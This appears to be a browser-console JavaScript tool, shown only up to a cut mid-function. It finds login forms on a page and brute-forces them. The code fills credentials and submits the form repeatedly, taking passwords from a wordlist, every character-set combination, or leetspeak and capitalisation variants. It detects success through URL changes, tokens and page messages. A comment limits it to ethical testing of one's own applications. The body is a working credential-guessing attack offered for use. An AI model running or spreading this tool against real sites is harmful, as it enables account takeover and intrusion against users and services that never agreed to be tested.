// Copy this code into the browser console of your own application
// Warning: Use this tool only for ethical security testing on your own applications!

(function () {
    // Create main container for our tool
    const createToolContainer = () => {
        // Existing code remains unchanged
        const container = document.createElement('div');
        container.id = 'security-test-tool';
        container.style.cssText = `
      position: fixed;
      top: 20px;
      right: 20px;
      width: 400px;
      background-color: #2C2E3B;
      color: white;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      font-family: Arial, sans-serif;
      z-index: 9999;
      padding: 15px;
      max-height: 90vh;
      overflow-y: auto;
    `;

        // Add header
        const header = document.createElement('div');
        header.innerHTML = `
      <h2 style="margin: 0 0 15px 0; font-size: 18px; display: flex; justify-content: space-between; align-items: center;">
        <span>Brute-Force-Test</span>
        <button id="security-tool-toggle" style="background: none; border: none; color: white; cursor: pointer; font-size: 20px;">−</button>
      </h2>
    `;
        container.appendChild(header);

        // Add content area
        const content = document.createElement('div');
        content.id = 'security-tool-content';
        container.appendChild(content);

        document.body.appendChild(container);

        // Toggle functionality
        document.getElementById('security-tool-toggle').addEventListener('click', function () {
            const content = document.getElementById('security-tool-content');
            if (content.style.display === 'none') {
                content.style.display = 'block';
                this.textContent = '−';
            } else {
                content.style.display = 'none';
                this.textContent = '+';
            }
        });

        // Drag functionality
        let isDragging = false;
        let offsetX, offsetY;

        header.addEventListener('mousedown', function (e) {
            if (e.target.id === 'security-tool-toggle') return; // Don't drag when clicking on toggle

            isDragging = true;
            const containerRect = container.getBoundingClientRect();
            offsetX = e.clientX - containerRect.left;
            offsetY = e.clientY - containerRect.top;

            container.style.cursor = 'grabbing';
        });

        document.addEventListener('mousemove', function (e) {
            if (!isDragging) return;

            container.style.left = (e.clientX - offsetX) + 'px';
            container.style.top = (e.clientY - offsetY) + 'px';
        });

        document.addEventListener('mouseup', function () {
            isDragging = false;
            container.style.cursor = 'default';
        });

        return content;
    };

    // Remove the tool if it already exists
    const existingTool = document.getElementById('security-test-tool');
    if (existingTool) {
        document.body.removeChild(existingTool);
    }

    // Create tool container
    const contentArea = createToolContainer();

    // Scanner for form fields (existing code)
    const scanForFields = () => {
        // Find all input fields including Angular Material
        const allInputs = document.querySelectorAll('input, textarea, select, mat-input');
        const formFields = [];

        // Analyze fields by types and attributes
        allInputs.forEach(input => {
            const type = input.type || 'text';
            const id = input.id || '';
            const name = input.name || '';
            const placeholder = input.placeholder || '';
            const classes = Array.from(input.classList).join(' ');
            const isPassword = type === 'password';
            const isHidden = input.style.display === 'none' ||
                window.getComputedStyle(input).display === 'none' ||
                input.type === 'hidden';

            let fieldType = type;

            // Try to intelligently guess the field type
            if (isPassword) {
                fieldType = 'password';
            } else if (name.toLowerCase().includes('user') ||
                id.toLowerCase().includes('user') ||
                placeholder.toLowerCase().includes('user') ||
                classes.toLowerCase().includes('user') ||
                name.toLowerCase().includes('email') ||
                id.toLowerCase().includes('email') ||
                placeholder.toLowerCase().includes('email') ||
                classes.toLowerCase().includes('email')) {
                fieldType = 'username';
            }

            // Check Angular Material labels
            const matFormField = input.closest('mat-form-field');
            if (matFormField) {
                const label = matFormField.querySelector('mat-label');
                if (label) {
                    const labelText = label.textContent.toLowerCase();
                    if (labelText.includes('password')) {
                        fieldType = 'password';
                    } else if (labelText.includes('user') || labelText.includes('email')) {
                        fieldType = 'username';
                    }
                }
            }

            formFields.push({
                element: input,
                type: fieldType,
                id,
                name,
                placeholder,
                classes,
                isPassword,
                isHidden
            });
        });

        return formFields;
    };

    // Scan forms (existing code)
    const scanForms = () => {
        const forms = document.querySelectorAll('form');
        const formList = [];

        forms.forEach((form, index) => {
            const id = form.id || `form-${index}`;
            const action = form.action || 'unknown';
            const method = form.method || 'GET';
            const submitButton = form.querySelector('button[type="submit"], input[type="submit"]');

            formList.push({
                element: form,
                id,
                action,
                method,
                submitButton,
                fields: Array.from(form.querySelectorAll('input, textarea, select'))
            });
        });

        return formList;
    };

    // Create UI
    const createUI = () => {
        const fields = scanForFields();
        const forms = scanForms();
        const passwordFields = fields.filter(f => f.isPassword);
        // Expand the detection of username fields
        const usernameFields = fields.filter(f =>
            f.type === 'username' ||
            f.type === 'email' ||
            f.type === 'text' || // Add text fields, as many login forms use simple text inputs for usernames
            (!f.isPassword && !f.isHidden && (
                f.id.toLowerCase().includes('user') ||
                f.id.toLowerCase().includes('email') ||
                f.id.toLowerCase().includes('login') ||
                f.name.toLowerCase().includes('user') ||
                f.name.toLowerCase().includes('email') ||
                f.name.toLowerCase().includes('login') ||
                f.placeholder.toLowerCase().includes('user') ||
                f.placeholder.toLowerCase().includes('email') ||
                f.placeholder.toLowerCase().includes('login')
            ))
        );

        // HTML for the tool
        let html = `
      <div style="margin-bottom: 15px;">
        <h3 style="margin: 0 0 8px 0; font-size: 16px;">Found Form Fields:</h3>
        <div style="background-color: #373948; padding: 10px; border-radius: 5px;">
    `;

        if (fields.length === 0) {
            html += `<p style="margin: 0; color: #ff9999;">No form fields found.</p>`;
        } else {
            html += `<ul style="margin: 0; padding-left: 20px;">`;
            fields.forEach(field => {
                const hiddenText = field.isHidden ? ' (hidden)' : '';
                html += `<li style="margin-bottom: 5px;">
          <span style="font-weight: bold;">${field.type}</span>: 
          ${field.id || field.name || 'unnamed'}${hiddenText}
        </li>`;
            });
            html += `</ul>`;
        }
        html += `</div></div>`;

        // Display forms
        html += `
      <div style="margin-bottom: 15px;">
        <h3 style="margin: 0 0 8px 0; font-size: 16px;">Found Forms:</h3>
        <div style="background-color: #373948; padding: 10px; border-radius: 5px;">
    `;

        if (forms.length === 0) {
            html += `<p style="margin: 0; color: #ff9999;">No forms found.</p>`;
        } else {
            html += `<ul style="margin: 0; padding-left: 20px;">`;
            forms.forEach(form => {
                html += `<li style="margin-bottom: 5px;">
          <span style="font-weight: bold;">${form.id}</span>: 
          Method: ${form.method}, Fields: ${form.fields.length}
        </li>`;
            });
            html += `</ul>`;
        }
        html += `</div></div>`;

        // Only show brute-force area if password and username fields were found
        if (passwordFields.length > 0 && usernameFields.length > 0) {
            html += `
        <div style="margin-bottom: 15px;">
          <h3 style="margin: 0 0 8px 0; font-size: 16px;">Brute-Force Test:</h3>
          <div style="background-color: #373948; padding: 10px; border-radius: 5px;">
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Username field:</label>
              <select id="username-field-select" style="width: 100%; padding: 5px; border-radius: 4px;">
                ${usernameFields.map((field, idx) =>
                `<option value="${idx}">${field.id || field.name || 'Field ' + idx} (${field.type})</option>`
            ).join('')}
              </select>
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Password field:</label>
              <select id="password-field-select" style="width: 100%; padding: 5px; border-radius: 4px;">
                ${passwordFields.map((field, idx) =>
                `<option value="${idx}">${field.id || field.name || 'Field ' + idx} (${field.type})</option>`
            ).join('')}
              </select>
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Username:</label>
              <input type="text" id="bf-username" style="width: 100%; padding: 5px; border-radius: 4px;" 
                     placeholder="Username to test">
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Brute-Force Method:</label>
              <select id="bf-method" style="width: 100%; padding: 5px; border-radius: 4px;">
                <option value="list">Use password list</option>
                <option value="charset">Use character set (all combinations)</option>
                <option value="variations">Generate variations (leetspeak, capitalization, separators)</option>
              </select>
            </div>
            
            <div id="password-list-section" style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Password Source:</label>
              <div style="margin-bottom: 10px;">
                <select id="password-source" style="width: 100%; padding: 5px; border-radius: 4px;">
                  <option value="local">Local file</option>
                  <option value="manual">Manual entry</option>
                </select>
              </div>
              
              <!-- Local file option -->
              <div id="local-file-section">
                <div style="display: flex; margin-bottom: 5px;">
                  <input type="file" id="password-file" accept=".txt" style="flex-grow: 1;">
                  <button id="load-password-file" style="background-color: #4a6ed3; color: white; border: none; border-radius: 4px; padding: 0 10px; cursor: pointer; margin-left: 5px;">Load</button>
                </div>
                <div id="file-info" style="font-size: 12px; margin-bottom: 5px; color: #aaa; display: none;">
                  File loaded: <span id="file-name"></span> (<span id="password-count">0</span> passwords)
                </div>
              </div>
              
              <!-- Manual entry -->
              <div id="manual-entry-section" style="display: none;">
                <textarea id="bf-password-list" style="width: 100%; height: 80px; padding: 5px; border-radius: 4px;" 
                        placeholder="One password per line"></textarea>
              </div>
            </div>
            
            <div id="charset-section" style="margin-bottom: 10px; display: none;">
              <div style="margin-bottom: 10px;">
                <label style="display: block; margin-bottom: 5px;">Character set:</label>
                <div style="display: flex; flex-wrap: wrap; gap: 5px; margin-bottom: 5px;">
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-lowercase" checked> a-z
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-uppercase"> A-Z
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-numbers"> 0-9
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-special"> !@#$%^&*
                  </label>
                </div>
                <input type="text" id="charset-custom" style="width: 100%; padding: 5px; border-radius: 4px;" 
                       placeholder="Custom character set (optional)">
              </div>
              
              <div style="display: flex; gap: 10px; margin-bottom: 5px;">
                <div style="flex: 1;">
                  <label style="display: block; margin-bottom: 5px;">Min. Length:</label>
                  <input type="number" id="min-length" style="width: 100%; padding: 5px; border-radius: 4px;" value="1" min="1" max="8">
                </div>
                <div style="flex: 1;">
                  <label style="display: block; margin-bottom: 5px;">Max. Length:</label>
                  <input type="number" id="max-length" style="width: 100%; padding: 5px; border-radius: 4px;" value="3" min="1" max="8">
                </div>
              </div>
              
              <div style="background-color: #2c2e3b; padding: 5px; border-radius: 4px; font-size: 12px; margin-bottom: 5px;">
                <strong>Warning:</strong> Large character sets and lengths > 4 can be very slow and may freeze the browser.
              </div>
            </div>
            
            <div id="variations-section" style="margin-bottom: 10px; display: none;">
              <div style="margin-bottom: 10px;">
                <label style="display: block; margin-bottom: 5px;">Base password/phrase:</label>
                <input type="text" id="base-phrase" style="width: 100%; padding: 5px; border-radius: 4px;" 
                       placeholder="e.g., mr.noodles">
              </div>
              
              <div style="margin-bottom: 10px;">
                <label style="display: block; margin-bottom: 5px;">Variation options:</label>
                <div style="display: flex; flex-wrap: wrap; gap: 10px;">
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="use-leetspeak" checked> Leetspeak
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="use-separators" checked> Separator variations
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="use-capitalization" checked> Capitalization
                  </label>
                </div>
              </div>
              
              <button id="preview-variations" style="width: 100%; padding: 8px; background-color: #5a5a5a; color: white; 
                     border: none; border-radius: 4px; cursor: pointer; margin-bottom: 5px;">Preview Variations</button>
              
              <div id="variations-preview" style="max-height: 150px; overflow-y: auto; background-color: #252733; 
                     padding: 8px; border-radius: 4px; font-size: 12px; display: none;">
              </div>
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Delay between attempts (ms):</label>
              <input type="number" id="bf-delay" style="width: 100%; padding: 5px; border-radius: 4px;" value="10">
            </div>
            
            <div style="display: flex; gap: 10px;">
              <button id="start-bf-button" style="flex-grow: 1; padding: 8px; background-color: #4a6ed3; color: white; 
                     border: none; border-radius: 4px; cursor: pointer;">Start</button>
              <button id="stop-bf-button" style="flex-grow: 1; padding: 8px; background-color: #d34a4a; color: white; 
                     border: none; border-radius: 4px; cursor: pointer; display: none;">Stop</button>
            </div>
            
            <div id="bf-status" style="margin-top: 10px; padding: 8px; background-color: #2C2E3B; border-radius: 4px;">
              Ready...
            </div>
            
            <div id="info-line" style="margin-top: 10px; padding: 8px; background-color: #252733; border-radius: 4px; font-size: 13px; display: none;">
              <div>Last attempt: <span id="last-attempt">-</span></div>
              <div>Status: <span id="last-attempt-status">-</span></div>
            </div>
          </div>
        </div>
      `;
        }

        contentArea.innerHTML = html;

        // Add event listeners if password and username fields were found
        if (passwordFields.length > 0 && usernameFields.length > 0) {
            let running = false;
            let stopRequested = false;
            let passwords = []; // Global variable for all passwords

            // Toggle between password sources
            document.getElementById('password-source').addEventListener('change', function () {
                const source = this.value;
                document.getElementById('local-file-section').style.display = source === 'local' ? 'block' : 'none';
                document.getElementById('manual-entry-section').style.display = source === 'manual' ? 'block' : 'none';
            });

            // File upload functionality
            document.getElementById('load-password-file').addEventListener('click', function () {
                const fileInput = document.getElementById('password-file');
                const file = fileInput.files[0];

                if (!file) {
                    updateStatus('Error: No file selected!', true);
                    return;
                }

                const reader = new FileReader();

                reader.onload = function (e) {
                    const content = e.target.result;
                    passwords = content.split(/\r?\n/).filter(line => line.trim() !== '');

                    document.getElementById('file-info').style.display = 'block';
                    document.getElementById('file-name').textContent = file.name;
                    document.getElementById('password-count').textContent = passwords.length;

                    updateStatus(`Password list loaded: ${passwords.length} passwords from ${file.name}`, false);
                };

                reader.onerror = function () {
                    updateStatus('Error reading file!', true);
                };

                reader.readAsText(file);
            });

            // Preview variations button
            const previewButton = document.getElementById('preview-variations');
            if (previewButton) {
                previewButton.addEventListener('click', function () {
                    const basePhrase = document.getElementById('base-phrase').value.trim();
                    if (!basePhrase) {
                        updateStatus('Error: Please enter a base phrase!', true);
                        return;
                    }
                    
                    const options = {
                        useLeetspeak: document.getElementById('use-leetspeak').checked,
                        useSeparators: document.getElementById('use-separators').checked,
                        useCapitalization: document.getElementById('use-capitalization').checked
                    };
                    
                    const variations = generateAllVariations(basePhrase, options);
                    const previewDiv = document.getElementById('variations-preview');
                    
                    previewDiv.innerHTML = `<strong>Generated ${variations.length} variations:</strong><br><br>` +
                        variations.map(v => `• ${v}`).join('<br>');
                    previewDiv.style.display = 'block';
                    
                    updateStatus(`Generated ${variations.length} variations for "${basePhrase}"`, false);
                });
            }

            // Leetspeak mapping
            const leetSpeakMap = {
                'a': ['4', '@'],
                'e': ['3'],
                'i': ['1', '!'],
                'o': ['0'],
                's': ['5', '$'],
                't': ['7'],
                'l': ['1'],
                'g': ['9'],
                'z': ['2'],
                'b': ['8']
            };

            // Generate leetspeak variations
            const generateLeetSpeakVariations = (word) => {
                const variations = new Set([word]);
                
                const generateVariation = (current, index) => {
                    if (index >= current.length) {
                        variations.add(current);
                        return;
                    }
                    
                    const char = current[index].toLowerCase();
                    generateVariation(current, index + 1);
                    
                    if (leetSpeakMap[char]) {
                        for (const replacement of leetSpeakMap[char]) {
                            const newWord = current.slice(0, index) + replacement + current.slice(index + 1);
                            generateVariation(newWord, index + 1);
                        }
                    }
                };
                
                generateVariation(word, 0);
                return Array.from(variations);
            };

            // Generate capitalization variations
            const generateCapitalizationVariations = (word) => {
                const variations = new Set();
                
                // All lowercase
                variations.add(word.toLowerCase());
                
                // All uppercase
                variations.add(word.toUpperCase());
                
                // First letter capitalized
                variations.add(word.charAt(0).toUpperCase() + word.slice(1).toLowerCase());
                
                // Title case (capitalize first letter of each word part)
                const titleCase = word.replace(/\b\w/g, l => l.toUpperCase());
                variations.add(titleCase);
                
                // Camel case variations
                const parts = word.split(/[\s._-]/);
                if (parts.length > 1) {
                    // camelCase
                    const camelCase = parts[0].toLowerCase() + parts.slice(1).map(p => 
                        p.charAt(0).toUpperCase() + p.slice(1).toLowerCase()
                    ).join('');
                    variations.add(camelCase);
                    
                    // PascalCase
                    const pascalCase = parts.map(p => 
                        p.charAt(0).toUpperCase() + p.slice(1).toLowerCase()
                    ).join('');
                    variations.add(pascalCase);
                }
                
                // Random capitalization patterns
                const randomPatterns = [
                    word => word.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join(''),
                    word => word.split('').map((c, i) => i % 2 === 1 ? c.toLowerCase() : c.toUpperCase()).join('')
                ];
                
                randomPatterns.forEach(pattern => variations.add(pattern(word)));
                
                return Array.from(variations);
            };

            // Generate separator variations
            const generateSeparatorVariations = (phrase) => {
                const variations = new Set();
                
                // Split by common separators
                const parts = phrase.split(/[\s._-]+/);
                
                if (parts.length > 1) {
                    // No separator
                    variations.add(parts.join(''));
                    
                    // Common separators
                    const separators = ['', '.', '_', '-', ' '];
                    separators.forEach(sep => variations.add(parts.join(sep)));
                    
                    // Mixed separators for more than 2 parts
                    if (parts.length > 2) {
                        variations.add(parts[0] + '.' + parts.slice(1).join(''));
                        variations.add(parts[0] + '_' + parts.slice(1).join(''));
                        variations.add(parts[0] + parts.slice(1).join('_'));
                    }
                } else {
                    variations.add(phrase);
                }
                
                return Array.from(variations);
            };

            // Generate all variations combining leetspeak, capitalization, and separators
            const generateAllVariations = (basePhrase, options = {useLeetspeak: true, useSeparators: true, useCapitalization: true}) => {
                const allVariations = new Set();
                
                // First generate separator variations
                const separatorVariations = options.useSeparators ? generateSeparatorVariations(basePhrase) : [basePhrase];
                
                separatorVariations.forEach(sepVar => {
                    // Then generate capitalization variations
                    const capVariations = options.useCapitalization ? generateCapitalizationVariations(sepVar) : [sepVar];
                    
                    capVariations.forEach(capVar => {
                        // Add non-leetspeak version
                        allVariations.add(capVar);
                        
                        // Generate leetspeak variations if enabled
                        if (options.useLeetspeak) {
                            const leetVariations = generateLeetSpeakVariations(capVar);
                            leetVariations.forEach(leetVar => allVariations.add(leetVar));
                        }
                    });
                });
                
                return Array.from(allVariations);
            };

            // Toggle between password list, character set, and variations method
            document.getElementById('bf-method').addEventListener('change', function () {
                const method = this.value;
                document.getElementById('password-list-section').style.display = method === 'list' ? 'block' : 'none';
                document.getElementById('charset-section').style.display = method === 'charset' ? 'block' : 'none';
                document.getElementById('variations-section').style.display = method === 'variations' ? 'block' : 'none';
            });

            // Helper function to generate passwords based on character set
            const generatePasswordsFromCharset = (charset, minLength, maxLength) => {
                const passwords = [];

                // Recursive function to generate all combinations
                const generateCombinations = (currentPassword, length) => {
                    if (length === 0) {
                        passwords.push(currentPassword);
                        return;
                    }

                    for (let i = 0; i < charset.length; i++) {
                        generateCombinations(currentPassword + charset[i], length - 1);
                    }
                };

                // Generate for each length between min and max
                for (let length = minLength; length <= maxLength; length++) {
                    generateCombinations('', length);
                }

                return passwords;
            };

            // Helper function to generate a character set based on user selection
            const buildCharset = () => {
                let charset = '';

                if (document.getElementById('charset-lowercase').checked) {
                    charset += 'abcdefghijklmnopqrstuvwxyz';
                }

                if (document.getElementById('charset-uppercase').checked) {
                    charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
                }

                if (document.getElementById('charset-numbers').checked) {
                    charset += '0123456789';
                }

                if (document.getElementById('charset-special').checked) {
                    charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
                }

                const customCharset = document.getElementById('charset-custom').value.trim();
                if (customCharset) {
                    // Deduplicate the character set
                    for (let i = 0; i < customCharset.length; i++) {
                        if (charset.indexOf(customCharset[i]) === -1) {
                            charset += customCharset[i];
                        }
                    }
                }

                return charset;
            };

            // Generator for incremental passwords (for more efficient brute-forcing)
            const createPasswordGenerator = (charset, minLength, maxLength) => {
                let currentLength = minLength;
                let indices = Array(minLength).fill(0);

                return {
                    next: function () {
                        if (currentLength > maxLength) {
                            return {done: true, value: null};
                        }

                        // Generate current password
                        let password = '';
                        for (let i = 0; i < indices.length; i++) {
                            password += charset[indices[i]];
                        }

                        // Increase indices for next password
                        let pos = indices.length - 1;
                        while (pos >= 0) {
                            indices[pos]++;
                            if (indices[pos] < charset.length) {
                                break;
                            }
                            indices[pos] = 0;
                            pos--;
                        }

                        // If we've gone through all combinations for the current length
                        if (pos < 0) {
                            currentLength++;
                            if (currentLength <= maxLength) {
                                indices = Array(currentLength).fill(0);
                            }
                        }

                        return {done: false, value: password};
                    }
                };
            };

            // Helper function to update the info line
            const updateInfoLine = (username, password, status) => {
                const infoLine = document.getElementById('info-line');
                const lastAttempt = document.getElementById('last-attempt');
                const lastAttemptStatus = document.getElementById('last-attempt-status');

                infoLine.style.display = 'block';
                lastAttempt.textContent = `${username} / ${password}`;
                lastAttemptStatus.textContent = status;

                // Set color based on status
                if (status.includes('Success')) {
                    lastAttemptStatus.style.color = '#4CAF50';
                    infoLine.style.backgroundColor = '#1e3323';
                } else if (status.includes('Failed')) {
                    lastAttemptStatus.style.color = '#FF5252';
                } else {
                    lastAttemptStatus.style.color = '#FFC107';
                }
            };

            // Helper function to check for success/failure
            const checkLoginStatus = () => {
                // Check for URL change (common in SPAs)
                const currentUrl = window.location.href;
                if (currentUrl.includes('/search') || currentUrl.includes('/dashboard') || 
                    currentUrl.includes('/profile') || currentUrl.includes('/admin')) {
                    return 'success';
                }

                // Check for JWT token in localStorage/sessionStorage (common in modern apps)
                try {
                    const token = localStorage.getItem('token') || sessionStorage.getItem('token') ||
                                 localStorage.getItem('jwt') || sessionStorage.getItem('jwt') ||
                                 localStorage.getItem('authToken') || sessionStorage.getItem('authToken');
                    if (token && token.length > 50) { // JWT tokens are typically long
                        return 'success';
                    }
                } catch (e) {
                    // Ignore localStorage errors
                }

                // Specific for the Waiworinao application
                const messageElement = document.getElementById('message');
                if (messageElement) {
                    // Check for success or error message
                    if (messageElement.classList.contains('success')) {
                        return 'success';
                    } else if (messageElement.classList.contains('error')) {
                        return 'error';
                    }
                }

                // Angular Material specific checks
                const matSnackBar = document.querySelector('simple-snack-bar');
                if (matSnackBar) {
                    const snackText = matSnackBar.textContent.toLowerCase();
                    if (snackText.includes('login') || snackText.includes('welcome') || 
                        snackText.includes('authentication successful')) {
                        return 'success';
                    }
                    if (snackText.includes('invalid') || snackText.includes('failed') || 
                        snackText.includes('error')) {
                        return 'error';
                    }
                }

                // General checks
                // Look for elements with success/error classes or typical message texts
                const successIndicators = [
                    '.success', '.alert-success', '[class*="success"]',
                    '.message.success', '[data-success]', '.mat-snack-bar-container',
                    '.notification.success', '.toast.success', '.alert.alert-success'
                ];

                const errorIndicators = [
                    '.error', '.alert-danger', '.alert-error', '[class*="error"]',
                    '.message.error', '[data-error]', '.notification.error', 
                    '.toast.error', '.alert.alert-danger'
                ];

                for (const selector of successIndicators) {
                    const elements = document.querySelectorAll(selector);
                    for (const el of elements) {
                        if (el.offsetParent !== null) { // Check if the element is visible
                            const text = el.textContent.toLowerCase();
                            if (text.includes('success') || text.includes('welcome') || 
                                text.includes('login') || text.includes('authenticated')) {
                                return 'success';
                            }
                        }
                    }
                }

                for (const selector of errorIndicators) {
                    const elements = document.querySelectorAll(selector);
                    for (const el of elements) {
                        if (el.offsetParent !== null) { // Check if the element is visible
                            const text = el.textContent.toLowerCase();
                            if (text.includes('invalid') || text.includes('failed') || 
                                text.includes('error') || text.includes('incorrect')) {
                                return 'error';
                            }
                        }
                    }
                }

                // Look for texts in the page that indicate success/failure
                const bodyText = document.body.innerText.toLowerCase();
                if (bodyText.includes('login successful') ||
                    bodyText.includes('successfully logged in') ||
                    bodyText.includes('welcome back') ||
                    bodyText.includes('authentication successful')) {
                    return 'success';
                }

                if (bodyText.includes('invalid username') ||
                    bodyText.includes('incorrect password') ||
                    bodyText.includes('login failed') ||
                    bodyText.includes('authentication failed') ||
                    bodyText.includes('invalid credentials')) {
                    return 'error';
                }

                return 'unknown';
            };

            document.getElementById('start-bf-button').addEventListener('click', async function () {
                if (running) return;

                const usernameFieldIdx = parseInt(document.getElementById('username-field-select').value);
                const passwordFieldIdx = parseInt(document.getElementById('password-field-select').value);
                const username = document.getElementById('bf-username').value.trim();
                const delay = parseInt(document.getElementById('bf-delay').value);
                const method = document.getElementById('bf-method').value;
                const passwordSource = document.getElementById('password-source').value;

                if (!username) {
                    updateStatus('Error: Please enter a username!', true);
                    return;
                }

                let passwordGenerator;
                let totalPasswords = 0;

                if (method === 'list') {
                    // Get passwords depending on source
                    if (passwordSource === 'manual') {
                        const passwordListText = document.getElementById('bf-password-list').value.trim();

                        if (!passwordListText) {
                            updateStatus('Error: Please enter a password list!', true);
                            return;
                        }

                        passwords = passwordListText.split('\n').map(p => p.trim()).filter(p => p);
                    }

                    if (passwords.length === 0) {
                        updateStatus('Error: No valid passwords available!', true);
                        return;
                    }

                    let currentIndex = 0;
                    passwordGenerator = {
                        next: function () {
                            if (currentIndex >= passwords.length) {
                                return {done: true, value: null};
                            }
                            return {done: false, value: passwords[currentIndex++]};
                        }
                    };

                    totalPasswords = passwords.length;
                } else if (method === 'charset') {
                    // Use character set
                    const charset = buildCharset();
                    const minLength = parseInt(document.getElementById('min-length').value);
                    const maxLength = parseInt(document.getElementById('max-length').value);

                    if (charset.length === 0) {
                        updateStatus('Error: Please select a character set!', true);
                        return;
                    }

                    if (minLength > maxLength) {
                        updateStatus('Error: Minimum length cannot be greater than maximum length!', true);
                        return;
                    }

                    if (maxLength > 8) {
                        updateStatus('Error: Maximum length cannot be greater than 8 (browser limitation)!', true);
                        return;
                    }

                    // Calculate total number of possible passwords
                    let count = 0;
                    for (let len = minLength; len <= maxLength; len++) {
                        count += Math.pow(charset.length, len);
                    }

                    if (count > 100000) {
                        const confirmed = confirm(`Warning: ${count.toLocaleString()} possible passwords will be generated. This may take a long time and freeze the browser. Continue?`);
                        if (!confirmed) {
                            updateStatus('Brute-Force aborted.', false);
                            return;
                        }
                    }

                    passwordGenerator = createPasswordGenerator(charset, minLength, maxLength);
                    totalPasswords = count;
                } else {
                    // Use variations method
                    const basePhrase = document.getElementById('base-phrase').value.trim();
                    
                    if (!basePhrase) {
                        updateStatus('Error: Please enter a base phrase!', true);
                        return;
                    }
                    
                    const options = {
                        useLeetspeak: document.getElementById('use-leetspeak').checked,
                        useSeparators: document.getElementById('use-separators').checked,
                        useCapitalization: document.getElementById('use-capitalization').checked
                    };
                    
                    const variations = generateAllVariations(basePhrase, options);
                    
                    if (variations.length === 0) {
                        updateStatus('Error: No variations generated!', true);
                        return;
                    }
                    
                    let currentIndex = 0;
                    passwordGenerator = {
                        next: function () {
                            if (currentIndex >= variations.length) {
                                return {done: true, value: null};
                            }
                            return {done: false, value: variations[currentIndex++]};
                        }
                    };
                    
                    totalPasswords = variations.length;
                }

                running = true;
                stopRequested = false;
                document.getElementById('start-bf-button').style.display = 'none';
                document.getElementById('stop-bf-button').style.display = 'block';

                const usernameField = usernameFields[usernameFieldIdx].element;
                const passwordField = passwordFields[passwordFieldIdx].element;

                updateStatus(`Brute-Force started. Up to ${totalPasswords.toLocaleString()} passwords to test...`);

                // Find the form to which the fields belong
                let form = null;
                for (let f of forms) {
                    if (f.fields.includes(usernameField) || f.fields.includes(passwordField)) {
                        form = f.element;
                        break;
                    }
                }

                let count = 0;
                let result;
                let successfulPassword = null;
                let initialURL = window.location.href;

                // For each password:
                while (!(result = passwordGenerator.next()).done) {
                    count++;

                    if (stopRequested) {
                        updateStatus('Brute-Force stopped.', false);
                        break;
                    }

                    const password = result.value;

                    // Update status display with each attempt
                    updateStatus(`Test ${count.toLocaleString()}/${totalPasswords.toLocaleString()}: ${username} / ${password}`);

                    // Fill in fields
                    usernameField.value = username;
                    passwordField.value = password;

                    // Trigger field events (important for many modern JS frameworks)
                    triggerInputEvents(usernameField);
                    triggerInputEvents(passwordField);

                    // If a form exists, try a submission
                    if (form) {
                        // Save current URL
                        const startUrl = window.location.href;

                        // Check if a submit button exists
                        const submitButton = form.querySelector('button[type="submit"], input[type="submit"], button:not([type]), [role="button"]');

                        // Check if an onsubmit handler exists
                        const hasOnSubmitHandler = form.onsubmit !== null;

                        // Try to click the submit button or submit the form
                        if (submitButton) {
                            submitButton.click();
                        } else if (!hasOnSubmitHandler) {
                            try {
                                // Try to trigger an event if no submit button exists
                                const submitEvent = new Event('submit', {
                                    bubbles: true,
                                    cancelable: true
                                });
                                form.dispatchEvent(submitEvent);
                            } catch (e) {
                                console.error('Error triggering submit event:', e);
                            }
                        }

                        // Wait and then check for success/failure
                        await new Promise(resolve => setTimeout(resolve, delay));

                        // Check for URL change
                        if (window.location.href !== startUrl) {
                            // URL has changed - probably successful login
                            successfulPassword = password;
                            updateInfoLine(username, password, 'Success (URL change)');
                            showSuccessMessage(username, successfulPassword);
                            break;
                        }

                        // Check login status through DOM changes
                        const loginStatus = checkLoginStatus();

                        // Update information line
                        if (loginStatus === 'success') {
                            updateInfoLine(username, password, 'Success! Correct password found');
                            successfulPassword = password;
                            showSuccessMessage(username, successfulPassword);
                            break;
                        } else if (loginStatus === 'error') {
                            updateInfoLine(username, password, 'Failed');
                        } else {
                            updateInfoLine(username, password, 'Uncertain (no clear response)');
                        }

                        // Also check for elements displayed in the Waiworinao demo
                        const attemptUsernameEl = document.getElementById('attempt-username');
                        const attemptPasswordEl = document.getElementById('attempt-password');
                        if (attemptUsernameEl && attemptPasswordEl) {
                            if (attemptUsernameEl.textContent === username && attemptPasswordEl.textContent === password) {
                                // Login attempt was registered, check for success/failure
                                const messageEl = document.getElementById('message');
                                if (messageEl && messageEl.classList.contains('success')) {
                                    updateInfoLine(username, password, 'Success! Correct password found');
                                    successfulPassword = password;
                                    showSuccessMessage(username, successfulPassword);
                                    break;
                                }
                            }
                        }
                    } else {
                        // If no form was found, just wait
                        await new Promise(resolve => setTimeout(resolve, delay));

                        // Check if the URL has changed (successful login)
                        if (window.location.href !== initialURL) {
                            successfulPassword = password;
                            updateInfoLine(username, password, 'Success (URL change)');
                            showSuccessMessage(username, successfulPassword);
                            break;
                        }

                        // Check login status through DOM changes
                        const loginStatus = checkLoginStatus();
                        if (loginStatus === 'success') {
                            updateInfoLine(username, password, 'Success! Correct password found');
                            successfulPassword = password;
                            showSuccessMessage(username, successfulPassword);
                            break;
                        } else if (loginStatus === 'error') {
                            updateInfoLine(username, password, 'Failed');
                        } else {
                            updateInfoLine(username, password, 'Uncertain (no clear response)');
                        }
                    }
                }

                running = false;
                document.getElementById('start-bf-button').style.display = 'block';
